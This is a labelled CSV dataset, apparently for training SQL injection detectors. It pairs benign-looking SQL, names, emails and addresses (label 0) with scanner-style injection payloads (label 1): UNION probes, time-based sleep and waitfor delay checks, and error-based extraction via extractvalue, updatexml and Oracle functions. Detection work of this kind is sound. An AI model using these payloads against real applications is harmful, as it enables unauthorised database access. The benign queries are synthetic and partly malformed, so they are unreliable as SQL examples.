Query,Label
paulovic,0
SELECT * FROM die WHERE ball = 'edge',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7064 )  ORDER BY meta_id ASC",0
"1' and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"   SELECT passage, mine+ ', ' + tiny+ ' ' + mail+ ', ' + character AS capital  FROM importance",0
newlinsky@forohh.et,0
seyler@miami-beach.gw,0
"   SELECT market, ever, control FROM slope WHERE material  IS NULL",0
SELECT AVG ( river )  FROM football  SELECT SUM ( shade ) ,0
selwart@studentrooms.zr,0
1' where 8469  =  8469,1
SELECT * FROM vessels FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM chart WHERE inch BETWEEN never09/01/1996mean AND done15/31/1996noise,0
"1 union all select null,null,null,null,null,null,null,null,null--",1
00033926r,0
SELECT TOP 50 PERCENT * FROM across SELECT * FROM agree FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0
clay@parcalia.ml,0
"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,1
SELECT AVG ( cold )  FROM push  SELECT SUM ( price ) ,0
"  SELECT business,meal FROM happen WHERE swing = 'mind' UNION SELECT cheese, toward FROM rod",0
"calle del mistral, 65",0
SELECT AVG ( Price ) FROM truck,0
SELECT COUNT ( funny )  FROM understanding,0
SELECT * FROM  ( SELECT machine FROM combine ) ,0
eseyente,0
echecopar torrella,0
rohan,0
gelis,0
select * from users where id  =  1 +  (  \  )   or 1  =  1 -- 1,1
1%'   )    )    and 4595  =  4595#,1
"calle mercurio, 19,",0
8318,0
"  SELECT salmon AS sea, welcome AS [recent]  FROM instant",0
1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
1.44E+15,0
"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
" select * from users where id  =  1 or "";&"" or 1  =  1 -- 1",1
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'zfrs'  =  'zfrs",1
terland-bartha5@informatica2009.ck,0
satorras maynol,0
group by userid having 1  =  1--,1
"INSERT INTO vote ( frame, more, from, date, simple, children )  VALUES  ( 'stand', 'love'. upon', 'mill', 'if', 'system', 'deep' )  ",0
22200,0
"1   )    )    as cvid where 4381  =  4381 union all select null,null--",1
7.05723E+15,0
SELECT bound ( s FROM year RIGHT JOIN,0
"-7418 union all select 1340,1340,1340,1340,1340#",1
waitfor delay '0:0:5'--,1
"-9736' or make_set  (  7311  =  2067,2067  )   and 'czdt' like 'czdt",1
brendel@esposo.com.lk,0
63eb2ya,0
SELECT * FROM national WHERE with  BETWEEN 10 AND 20,0
"-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1
"1""   )    )    as fapw where 4722  =  4722 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM opposite ORDER BY rope DESC,0
SELECT DISTINCT proud FROM did,0
1 where 5691  =  5691 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1
SELECT AVG ( buy ) FROM pocket,0
"   SELECT sink, trade, men FROM fine WHERE move  IS NULL",0
SELECT * FROM forth WHERE wish BETWEEN '1996-07-01' AND '1996-07-31',0
84q42o,0
SELECT * FROM do WHERE NOT thy = 'peace'  AND NOT identity = 'flow',0
SELECT AVG ( gravity ) FROM fence SELECT SUM ( largest ) ,0
" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
c/ cofa 39,0
antero,0
SELECT * FROM headed,0
SELECT change ( s )  FROM chicken UNION ALL,0
poncin@todobetis.mil,0
"1%'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",1
SELECT tool ( s )  FROM gray UNION ALL,0
pijahumeda,0
57418420r,0
"1%'   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
78,0
"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
SELECT * FROM ill WHERE people NOT BETWEEN 'health' AND 'discussion',0
"-4100'   )    )    union all select 1163,1163,1163--",1
SELECT situation ( s )  FROM introduced SELECT fire FROM refer,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_middle_button_text' LIMIT 1,0
"1%'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
0n9ped7,0
SELECT COUNT ( DISTINCT shout )  FROM sky,0
"1  )   as tjwa where 1173  =  1173 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'nhmz' like 'nhmz",1
SELECT AVG ( son ) FROM frighten SELECT SUM ( declared ) ,0
-4637' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
SELECT * FROM prize FETCH FIRST 50 PERCENT ROWS ONLY,0
90230020p,0
"  SELECT smokeID AS ID, fire AS without FROM during",0
"calle doctor bove, 65",0
8534,0
-5020%'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',1
"1""   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fjwv"" like ""fjwv",1
"-4866""  )   as eyrq where 8365  =  8365 or 1898  =  8320#",1
14230,0
"1'||  (  select 'nfgq' where 1837  =  1837 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM person  WHERE feathers = solid,0
-8112'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'xopg'  =  'xopg,1
1'   )    )    as tlsl where 8467  =  8467,1
napoli.scaccia@distritoeste.sv,0
1.82575E+15,0
40444,0
-3861'  )   as zmja where 4036  =  4036 or 9323  =  9323#,1
21840329n,0
"1%'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",1
16452,0
SELECT * FROM rock WHERE anything IN  ( SELECT say FROM curious ) ,0
2354,0
SELECT * FROM  ( SELECT night FROM floating ) ,0
25g0a00,0
SELECT AVG ( provide ) FROM opposite,0
bogs terradas,0
"1"" where 2365  =  2365 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"-5292'  )   union all select 1439,1439,1439,1439#",1
onofre,0
garabatos,0
select   (  case when   (  4624  =  4844  )   then 4624 else 1/  (  select 0  )   end  )  --,1
SELECT DISTINCT ice FROM cowboy,0
SELECT TOP 3 * FROM signal WHERE vast = 'yes',0
SELECT * FROM bright WHERE wooden = 'fresh'  AND City = 'canal',0
" SELECT * FROM have ORDER BY careful, send",0
36574,0
"1' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
95001516q,0
mccarthy.darcy@tantomontamontatanto.jo,0
"c/ las niadas, 67 9?f",0
distar,0
fontanarejo,0
6.59091E+15,0
"1""  )   where 4739  =  4739 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",1
robin@comerciosdeaspe.info,0
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'mhvy' like 'mhvy",1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""cwat"" like ""cwat",1
1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,1
25559456q,0
"SELECT * FROM replace WHERE buffalo BETWEEN ""examine"" AND    ""choose""",0
3.88E+15,0
select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,1
61tico,0
zubicueta vallb,0
"1""  )   union all select null,null,null#",1
"1',row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",1
"1'   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  'zeum'  =  'zeum",1
1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',1
4170,0
"  SELECT * FROM measure WHERE accurate IN  ( 'observe', 'suggest', 'current' )  ",0
1'  )   as lgex where 4068  =  4068 and 1378  =  9247--,1
SELECT clear FROM heading UNION ALL SELECT brought FROM quietly ORDER BY far,0
-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1
SELECT AVG ( Price ) FROM consider,0
1'  )   where 9516  =  9516,1
34260,0
cancia,0
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1
SELECT observe ( s FROM high RIGHT JOIN,0
"-7868"" union all select 1805--",1
schucrenberg-oheaney3@testdevelcidad.info,0
SELECT * FROM wore WHERE date = 'exchange',0
"1%'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  '",1
"1%"" union all select null,null,null,null--",1
"1 where 6965  =  6965 and elt  (  3933  =  1232,1232  )  --",1
SELECT * FROM thrown WHERE judge = 'oil' FETCH FIRST 3 ROWS ONLY,0
39515,0
SELECT AVG ( recognize ) FROM quiet,0
kalpak,0
"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""zptu""  =  ""zptu",1
SELECT * FROM  ( SELECT what FROM complex ) ,0
SELECT TOP 3 * FROM food WHERE begun = 'careful' SELECT * FROM milk,0
5013,0
"-8734%""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,1
SELECT * FROM discover  WHERE every = married,0
"  SELECT shotID AS ID, same AS fuel FROM finger",0
lombardo,0
bahabn de esgueva,0
SELECT * FROM heat WHERE    NOT army = 'under',0
6.73367E+15,0
SELECT about FROM tell UNION ALL SELECT nose FROM bad ORDER BY safety,0
"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",1
mccaffria_malanowicz@fbi-criminal-network.com.mr,0
SELECT plastic ( s )  FROM six,0
"-2605""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""cikb"" like ""cikb",1
cunanan,0
SELECT * FROM  ( SELECT silly FROM thin ) ,0
SELECT TOP 3 * FROM yellow,0
SELECT respect ( s )  FROM same UNION,0
"  SELECT climbID AS ID, think AS weight FROM talk",0
SELECT * FROM stand FETCH FIRST 50 PERCENT ROWS ONLY,0
1   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  4694  =  4694,1
"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1
SELECT * FROM type FETCH FIRST 3 ROWS ONLY,0
"-9699""   )    )    or   (  8459  =  8459  )  *4906 and    (    (   ""dufs""  =  ""dufs",1
-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,1
"1""   )    )    as sgln where 7573  =  7573",1
"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",1
SELECT * FROM safe WHERE active = 'plural' LIMIT 3,0
calle oxigeno 197,0
and 1 in   (  select var from temp  )  --,1
SELECT matter FROM frog UNION SELECT cheese FROM length ORDER BY environment,0
SELECT TOP 3 * FROM hurt,0
de la cerda gassol,0
SELECT MIN ( said )  AS deal FROM statement,0
1  )   as nsdy where 7513  =  7513,1
-6855'  )   or 8519  =  9248,1
"paseo los gofiones, 62,",0
DELETE FROM pan WHERE halfway = 'range',0
"INSERT INTO thumb ( poem, silence, tonight, active, shoot, fort )  VALUES  ( 'clothing', 'shore'. canal', 'vapor', 'task', 'either', 'unless' )  ",0
SELECT cannot FROM half UNION SELECT curve FROM very ORDER BY machinery,0
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'acml' like 'acml,1
SELECT COUNT ( spite )  FROM kids,0
39654869v,0
ninon,0
"1""   )    )     )   union all select null,null,null,null#",1
3o7za732,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""%""  =  """,1
"waitfor delay '0:0:5' and ""%""  =  """,1
4350,0
"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",1
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre",1
SELECT MIN ( ground )  AS ship FROM sheep,0
"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",1
brana@housemovie.id,0
SELECT * FROM burn WHERE race BETWEEN voyage09/01/1996paid AND secret15/31/1996goes,0
"1  )   as qjbd where 2808  =  2808   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1
SELECT * FROM fruit WHERE NOT recall = 'wheel'  AND NOT breathing = 'team',0
" SELECT column_name ( s )  FROM usual,change",0
"1%""   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
-4184'   )    )     )   or 2579  =  4654#,1
SELECT * FROM short WHERE feel LIKE '%plain%',0
dotty,0
SELECT * FROM rear WHERE recently = 'finger'  AND  ( next = 'depend' OR snake = 'rate' ) ,0
SELECT complex ( s )  FROM blow UNION,0
SELECT * FROM gulf WHERE salmon NOT BETWEEN 'town' AND 'curve',0
SELECT gravity ( s )  FROM please SELECT establish FROM letter,0
SELECT very ( s FROM slightly RIGHT JOIN,0
"  SELECT except,he,extra FROM child LEFT JOIN Orders ON market.classID =  palace.dead ORDER BY course.leader",0
SELECT MIN ( flat )  AS lower FROM railroad,0
correnta,0
"1"" where 7022  =  7022",1
SELECT column_name AS alias_name FROM table_name;,0
" select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1
24711,0
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""oyuj""  =  ""oyuj",1
huari,0
"alfalfa 47,",0
SELECT COUNT ( cake ) FROM porch,0
SELECT * FROM supply WHERE nobody = 'discover'  AND  ( they = 'faster' OR us = 'practical' ) ,0
"SELECT * FROM consonant WHERE grandfather BETWEEN ""living"" AND    ""against""",0
"1%"" union all select null#",1
SELECT * FROM invented WHERE raise BETWEEN band09/01/1996small AND people15/31/1996cross,0
1  )   where 2170  =  2170,1
SELECT * FROM southern WHERE should NOT LIKE 'ourselves%',0
cutillas,0
1'+  (  select wpai where 3685  =  3685,1
SELECT * FROM pretty WHERE up  BETWEEN 10 AND 20,0
mari cielo,0
SELECT * FROM like 3,0
 (  select   (  case when   (  3592  =  3592  )   then 3592 else 3592*  (  select 3592 from information_schema.character_sets  )   end   )    ) ,1
"-1287""  )   as bbzg where 1475  =  1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#",1
